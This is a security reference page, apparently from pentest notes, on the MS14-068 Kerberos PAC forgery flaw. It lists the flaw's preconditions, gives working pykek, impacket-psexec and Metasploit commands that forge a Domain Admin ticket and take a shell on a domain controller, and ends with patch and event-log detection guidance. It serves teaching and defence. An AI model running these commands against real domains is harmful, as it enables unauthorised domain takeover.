---
title: MS14-068 Kerberos PAC Forgery
slug: ms14-068-kerberos
---

> **TL;DR:** A KDC validation flaw let any domain user forge the PAC inside a TGT, claiming Domain Admin membership — turning a single low-priv password into instant domain compromise on unpatched DCs.

## What it is
MS14-068 (CVE-2014-6324) is a logic flaw in the Windows KDC's verification of the Privilege Attribute Certificate (PAC) checksum carried in Kerberos tickets. The KDC accepted a PAC signed with weaker algorithms (e.g. MD5/CRC) instead of strictly requiring a keyed signature derived from the KDC's krbtgt key. A standard domain user could craft a TGT whose PAC declared them a member of "Domain Admins" and the DC would honour it. Public tools `pykek` (Python) and Metasploit's `goldenPac` weaponised it within days of disclosure.

## Preconditions / where it applies
- Domain controller missing KB3011780 (patched November 2014)
- Any valid domain credential (username + password) — no admin rights required
- Reach to KDC on TCP/UDP 88 and target SMB on 445 for the follow-on `psexec`-style step
- Works across the forest; trust direction matters for cross-domain abuse

## Technique
```bash
# 1. Confirm patch state on the DC
nmap -p 88 --script krb5-enum-users dc01.corp.local
# Or check via SMB banner / WSUS history if you have a foothold

# 2. Forge the TGT with pykek
python2 ms14-068.py -u lowpriv@corp.local \
                    -s S-1-5-21-1111-2222-3333-1104 \
                    -d dc01.corp.local \
                    -p Summer2014!

# 3. Inject ccache and use it
export KRB5CCNAME=TGT_lowpriv@corp.local.ccache
klist
impacket-psexec -k -no-pass corp.local/lowpriv@dc01.corp.local
```

```text
# Metasploit one-shot
msf6 > use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
msf6 > set DOMAIN corp.local
msf6 > set USER lowpriv
msf6 > set PASSWORD Summer2014!
msf6 > set USER_SID S-1-5-21-...-1104
msf6 > run
```

## Detection and defence
- Patch: KB3011780 on every DC in the forest
- Event ID 4769 with `Ticket Encryption Type 0x17` (RC4) + privileged group claim by non-priv user
- Event ID 4624 logon as Administrator from a workstation that never authenticates as admin
- Hunt for PAC validation failures alongside successful service ticket issuance

## References
- [MSRC MS14-068 advisory](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068) — vendor bulletin
- [Sean Metcalf: MS14-068 deep dive](https://adsecurity.org/?p=541) — implementation detail

See also: [[golden-ticket]], [[pass-the-hash]], [[kerberos-enum]], [[dcsync]].
